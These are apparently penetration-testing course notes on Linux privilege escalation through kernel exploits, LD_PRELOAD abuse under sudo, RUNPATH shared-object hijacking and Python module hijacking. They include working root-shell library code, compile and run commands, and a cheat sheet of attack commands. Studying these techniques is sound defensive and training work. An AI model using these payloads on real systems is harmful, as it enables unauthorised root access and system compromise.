## 1. What "Internals-based" Covers Here

This category digs into how Linux actually executes code under the hood — the kernel itself, and the libraries and search paths that programs rely on to find the code they need at runtime. Where earlier sections focused on permissions, sudo, and services, this one is about getting a privileged process to load or run something it wasn't supposed to, by manipulating the machinery Linux uses to assemble a running program in the first place.

---

## 2. Kernel Exploits

The **kernel** is the core of the operating system, and like any software, specific kernel versions can have known, documented vulnerabilities. A well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195) — a flaw in how the kernel handles a memory-management technique called copy-on-write, which can be abused to gain root. Vulnerable kernel versions turn up surprisingly often in the wild, partly because legacy systems are hard to track, and administrators sometimes deliberately skip patching a kernel to avoid breaking compatibility with an older application or service.

> **Caution:** kernel exploits can cause real system instability, including crashes. Always exercise extra caution before running one against a production system, and make sure you understand exactly what it does first.

```bash
$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

- This confirms Ubuntu 16.04.4 LTS running kernel `4.4.0-116`. Searching that exact kernel string online turns up a public proof-of-concept [exploit](https://vulners.com/zdt/1337DAY-ID-30003) matching it.
- We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```bash
$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

```bash
$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

- The exploit's internal output here (`task_struct`, `uidptr`) reflects it directly manipulating kernel memory structures — specifically, finding and overwriting the current process's user ID at the kernel level to force it to `0` (root).

```bash
root# whoami

root
```

## 3. Shared Libraries

### 3.1 Static vs. Dynamic Libraries

Linux programs commonly rely on **shared libraries** — pre-compiled chunks of reusable code that multiple programs can call into, so developers don't have to rewrite the same logic over and over. There are two kinds:

| Type | File Extension | Key Property |
|---|---|---|
| Static library | `.a` | Gets baked directly into the compiled program; fixed at compile time and can't be altered afterward |
| Dynamic (shared object) library | `.so` | Loaded separately at the moment the program runs, which means it **can** be modified or swapped out to influence what the program actually does |

- Several mechanisms tell a program where to look for its dynamic libraries at runtime: compiler flags like `-rpath`/`-rpath-link`, the `LD_RUN_PATH` or `LD_LIBRARY_PATH` environment variables, the default system folders `/lib` or `/usr/lib`, or custom paths listed in `/etc/ld.so.conf`.
- A further environment variable, **`LD_PRELOAD`**, lets a specific library be force-loaded *before* a program starts — and whatever functions that library defines take priority over the program's normal ones.

### 3.2 Finding a Binary's Libraries with ldd

```bash
employee@NIX02:~$ ldd /bin/ls

    libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
    libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
    libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
    libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

- `ldd` lists every shared library a binary depends on, along with the exact path each one is being loaded from — the starting point for spotting anything unusual.
- The image above lists all the libraries required by `/bin/ls`, along with their absolute paths.

### 3.3 Walkthrough: LD_PRELOAD Privilege Escalation

```bash
employee@NIX02:~$ sudo -l

Matching Defaults entries for peter.parker on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User peter.parker may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

- This user can restart Apache as root, with no password. Normally this would be a dead end — `apache2` isn't a known GTFOBins entry, and the sudoers rule even uses an absolute path (closing off the PATH-abuse angle from earlier).
- The real issue is the separate line `env_keep+=LD_PRELOAD` — this tells sudo to **preserve** the `LD_PRELOAD` environment variable instead of stripping it out, which sudo normally does by default as a safety measure.
- We can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

- `_init()` is a special function that runs automatically the moment a shared library is loaded — no need to wait for any specific function inside the target program to be called. It immediately unsets `LD_PRELOAD` (tidying up after itself), sets both the group and user ID to `0` (root), and spawns a bash shell.

```bash
employee@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- `-fPIC -shared` compiles this as a proper position-independent shared object; `-nostartfiles` skips linking in the normal C runtime startup code, which isn't needed here and can otherwise interfere with a library meant to be preloaded this way.

```bash
employee@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

- Because sudo was explicitly configured to keep `LD_PRELOAD`, setting it right before the `sudo` command still takes effect inside the privileged process — loading the malicious library, running `_init()`, and dropping straight into a root shell before `apache2` itself ever actually restarts.

## 4. Shared Object Hijacking (RUNPATH Abuse)

This technique targets custom, in-development binaries that come bundled with their own non-standard libraries — common on systems where developers are actively building and testing software.

Consider the following `SETUID` binary:
```bash
employee@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

- A SUID-root binary — interesting on its own (see the earlier permission-based notes), but the real issue here lies in how it loads its libraries.
- We can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object.
- `Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

```bash
employee@NIX02:~$ ldd payroll

libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
```

- `libshared.so` is immediately suspicious — not a standard system library name, and loaded from a non-standard location, `/development`.
- As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility:

```bash
employee@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

- `readelf -d` inspects the binary's dynamic section directly. **RUNPATH** is a setting baked into the binary at compile time that tells the dynamic linker to check this specific folder for libraries — and critically, RUNPATH entries are checked *before* other standard library locations.

```bash
employee@NIX02:~$ ls -la /development/

drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
```

- `/development` is world-writable (`drwxrwxrwx`) — exactly the misconfiguration needed to exploit this. Since `payroll` runs as root (SUID) and trusts this folder first, any file placed here named `libshared.so` gets loaded as if it were the real library.

```bash
employee@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
employee@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

- Copying in a real library (`libc.so.6`) as a stand-in confirms the vulnerable path is actually being used — the program now complains about a missing function, `dbquery`, which is specific to the real `libshared.so` that `payroll` actually expects.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

- This rebuilds the missing function with exactly the name `payroll` is looking for (`dbquery`), but this version sets the UID to `0` and spawns a shell instead. Compile it using [GCC](https://linux.die.net/man/1/gcc).

```bash
employee@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
employee@NIX02:~$ ./payroll 

***************Evil Corp Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(evilcorp) groups=1000(evilcorp)
```

- `payroll` runs normally, calls `dbquery()` as part of its own expected logic, and the malicious version runs instead — spawning a root-privileged shell.

## 5. Python Library Hijacking

### 5.1 How Python Imports Work

Python's popularity is driven partly by its enormous ecosystem of libraries (also called modules) — things like [NumPy](https://numpy.org/doc/stable/) (numerical computing) and [Pandas](https://pandas.pydata.org/docs/) (data analysis and processing) are hugely common examples, alongside Python's own built-in [Standard Library](https://docs.python.org/3/library/). Modules are deliberately *not* all loaded automatically on every program run, for performance reasons — they're imported explicitly:

```python
# Method 1 - Module Import
import pandas

# Method 2 - Wildcard Import
from pandas import *

# Method 3 - Name Import
from pandas import Series
```

There are three broad ways a Python library import can be hijacked: 
1. Insecure write permissions directly on a module
2. Abusing the priority order Python searches for modules in
3. Manipulating the `PYTHONPATH` environment variable directly.

### 5.2 Technique 1: Insecure Write Permissions on a Module

For example, we can imagine that we are in a developer's host on the company's intranet and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If our user is allowed to run the Python script as `root` via `sudo`, our injected code will automatically be executed with those elevated privileges.

Let's first check our user's sudo privileges using the `sudo -l` command.
```bash
employee@lpenix:~$ sudo -l

Matching Defaults entries for employee on lpenix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User employee may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/employee/mem_status.py
```

- This user can run one specific script as root via Python, with no password.

```bash
employee@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mickey 188 Dec 13 20:13 mem_status.py
```

- The script itself is readable and executable, but not writable, and it shows a SUID bit (lowercase `s`) owned by root.
- **Important:** Linux deliberately ignores the SUID bit on interpreted scripts (Python, Bash, etc.) for security reasons — for SUID to actually have any effect here, it would need to be set on the interpreter itself (`/usr/bin/python3`), not on the script. Since it's only on the script, this bit has no practical effect, which is exactly why the sudo rule above is the real route in.

**Python Script Contents:**
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

- This script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that it imports the module `psutil` and uses the function `virtual_memory()`.
- So we can look for this function in the folder of `psutil` and check if this module has write permissions for us. If the *module* rather than the script has loose permissions, that's the real opening.

```bash
employee@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():

employee@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

- The module file itself is writable by **anyone** (the final `rw-` in `-rw-r--rw-` is the "other" permission group) — a misconfiguration most often seen on shared developer systems where many people legitimately need broad write access.

**Module Contents:**
```python
...SNIP...

def virtual_memory():

    ...SNIP...
    
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

- This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective.
- We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

**Module Contents - Hijacking:**
```python
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

- Inserting code at the very start of the existing function (rather than replacing it) means the script's normal behavior still completes afterward, drawing less attention.
- Now we can run the script with `sudo` and check if we get the desired result:

```bash
employee@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

- The injected `id` command runs as root (shown twice here, since `virtual_memory()` happens to be called twice inside the original script), confirming the hijack works — from here the test command can be swapped for a real payload, like a reverse shell.

### 5.3 Technique 2: Python Library Search Path Hijacking

Python checks a specific, ordered list of folders when looking for a module to import — earlier entries take priority over later ones.

```bash
employee@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

This technique requires two things to be true at once: 
1. The module the target script imports lives in a path that's *lower* on this list
2. Some *higher*-priority path on the list is writable by the current user.

If both hold, a replacement module can be dropped into the higher-priority location, and Python will find and use it first — never even reaching the real module.

In order for this to make a bit more sense, let us continue with the previous example and show how this can be exploited. Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:

```bash
employee@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

- Confirms `psutil`'s real location — fourth on the priority list above.
- From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.

```bash
employee@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

- After checking all of the directories listed, it appears that `/usr/lib/python3.8` — second on the priority list, so *higher priority* than where `psutil` actually lives — turns out to be world-writable (`drwxr-xrwx`).
- Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

- A replacement module, saved as `psutil.py` directly inside `/usr/lib/python3.8`. **It must match the real module's name and replicate the same function name and arguments being called**, or the hijack won't work. This minimal version only redefines `virtual_memory()`, so the rest of the script's actual behavior (which depends on other `psutil` functions) will fail afterward — which is fine for a quick proof of concept.
- Let us once again run the `mem_status.py` script using sudo like in the previous example.

```bash
employee@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```

- The injected `id` ran as root before the script crashed — proof the fake module was loaded *instead of* the real one. The crash afterward is expected and harmless to the technique itself; a more complete fake module (or a direct reverse shell payload) would avoid it entirely.

### 5.4 Technique 3: PYTHONPATH Environment Variable Abuse

**`PYTHONPATH`** is the environment variable that actually defines the module search list examined in the previous section. If a user is allowed to set this variable when running Python under sudo, they can redirect Python's module search entirely to a folder of their own choosing.

```bash
employee@lpenix:~$ sudo -l 

Matching Defaults entries for employee on LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User employee may run the following commands on LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

- The `SETENV` flag specifically permits the user to define environment variables when invoking this command via sudo — and because sudo itself is a trusted mechanism, any variable set this way isn't restricted the way it might otherwise be.
- This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the same malicious `psutil.py` script from **Technique 2** in the last section.

```bash
employee@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

- Here, the same hijacked `psutil.py` module from the previous technique was moved to `/tmp`, and `PYTHONPATH=/tmp/` forces Python to check that folder — regardless of its normal priority order — resulting in the same root-level code execution as before.

## 7. Cheat Sheet

| Goal | Command |
|---|---|
| Check kernel/OS version | `uname -a` / `cat /etc/lsb-release` |
| Compile a kernel exploit | `gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit` |
| List a binary's shared libraries | `ldd <binary>` |
| Check for a preserved LD_PRELOAD in sudoers | `sudo -l` (look for `env_keep+=LD_PRELOAD`) |
| Compile an LD_PRELOAD escalation library | `gcc -fPIC -shared -o root.so root.c -nostartfiles` |
| Run a command with a preloaded malicious library | `sudo LD_PRELOAD=/path/to/root.so <allowed-command>` |
| Check a binary's RUNPATH | `readelf -d <binary> \| grep PATH` |
| Build a malicious shared object matching a missing symbol | `gcc src.c -fPIC -shared -o <path-from-RUNPATH>/<libname>.so` |
| List Python's module search order | `python3 -c 'import sys; print("\n".join(sys.path))'` |
| Find where a Python module is installed | `pip3 show <module>` |
| Check a Python module's write permissions | `ls -l <path-to-module>.py` |
| Run a privileged script with a hijacked PYTHONPATH | `sudo PYTHONPATH=<writable-dir> /usr/bin/python3 <script>.py` |

## 8. Big-Picture Takeaways

1. **Everything here hinges on "the program trusts something it shouldn't."** A kernel trusting unpatched memory-handling code, a privileged process trusting an environment variable like `LD_PRELOAD`, a SUID binary trusting a writable `RUNPATH` folder, or a root-run script trusting a writable module path — the shape of the vulnerability is the same every time: trust placed somewhere an unprivileged user can actually reach.
2. **Anything that gets *loaded* into a process shares that process's privilege level.** A dynamically linked library, a preloaded shared object, or an imported Python module isn't a separate, lesser-privileged thing — once loaded into a root process, its code runs as root too.
3. **Interpreted-script SUID bits are a trap, not a shortcut.** Seeing an `s` bit on a Python or Bash script doesn't mean it's exploitable the way a compiled SUID binary would be — Linux ignores it by design, so always check whether a working privilege escalation route actually exists elsewhere (like sudo rules) before assuming the SUID bit itself is the way in.
4. **Search order is the quiet, recurring theme.** Whether it's `$PATH` (covered earlier), a binary's `RUNPATH`, or Python's `sys.path`, every one of these techniques works by getting something malicious checked — and found — *before* the real, legitimate target.
5. **Minimal proof-of-concept payloads are a smart first step.** Using `id` to confirm a hijack works, before swapping in a real reverse shell, limits the blast radius of a mistake and makes it obvious at a glance whether the technique actually succeeded.
